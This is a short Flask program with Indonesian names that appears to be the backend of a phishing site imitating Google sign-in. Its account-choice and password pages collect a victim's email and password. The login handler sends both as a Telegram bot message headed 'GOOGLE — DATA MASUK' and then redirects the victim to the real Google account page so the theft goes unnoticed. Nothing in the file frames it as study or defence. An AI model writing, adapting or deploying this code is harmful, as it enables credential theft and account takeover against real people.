from flask import Flask, request, redirect, send_file
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
REDIRECT = "https://myaccount.google.com/"

def kirim_telegram(email, pw):
    pesan = f"🔑 *GOOGLE — DATA MASUK*\n\n📧 Email: `{email}`\n🔒 Password: `{pw}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=data)

@app.route('/')
def pilih_akun():
    return send_file('pilih.html')

@app.route('/password')
def halaman_password():
    email = request.args.get('email', '')
    # Simpan email sebagai hidden di halaman password
    html = send_file('password.html')
    return html

@app.route('/login', methods=['POST'])
def tangkap():
    email = request.form.get('email')
    pw = request.form.get('pass')
    if email and pw:
        kirim_telegram(email, pw)
    return redirect(REDIRECT)

if __name__ == '__main__':
    app.run()
